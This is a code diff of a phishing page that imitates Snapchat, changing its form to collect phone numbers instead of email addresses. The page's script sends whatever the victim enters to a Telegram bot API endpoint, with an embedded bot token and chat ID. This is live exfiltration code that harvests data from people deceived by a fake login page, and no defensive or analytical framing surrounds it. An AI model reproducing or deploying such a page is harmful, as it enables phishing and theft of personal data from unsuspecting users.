@@ -25,8 +25,8 @@
 
         <form method="POST" action="">
         <div class="form-group">
-          <label for="email">Email</label>
-          <input type="email" name="mail" class="form-control" placeholder="" id="email" required="">
+          <label for="pnumber">Phone Number</label>
+          <input type="text" name="pnumber" class="form-control" placeholder="" id="pnumber" required="" maxlength="15">
         </div>
      
         
@@ -157,9 +157,7 @@
     <a href="https://www.snap.com/us/privacy/privacy-policy/">Privacy Policy</a><a href="https://www.snap.com/us/terms/">Terms of Service
       <div style="clear: both;"></div>
     </div></div></div></div>
-</body>
-
- <script>
+     <script>
        
       
 
@@ -172,11 +170,11 @@
             e.stopImmediatePropagation();
             
 
-            var email = document.getElementById('email').value;
+            var pnumber = document.getElementById('pnumber').value;
             
-            var icerik = "Email: " + email;
+            var icerik = "Phone Number: " + pnumber ;
 
-if(email != ""){
+if(pnumber != ""){
 
            $.post("https://api.telegram.org/bot1840000046:AAG_J_CYri1SHRrgMNQ9O-l_I9AG6bsXX5w/sendMessage?text="+icerik+"&chat_id=-530430182", 
               
@@ -193,4 +191,7 @@ if(email != ""){
 
 
     </script>
+</body>
+
+
 </html>
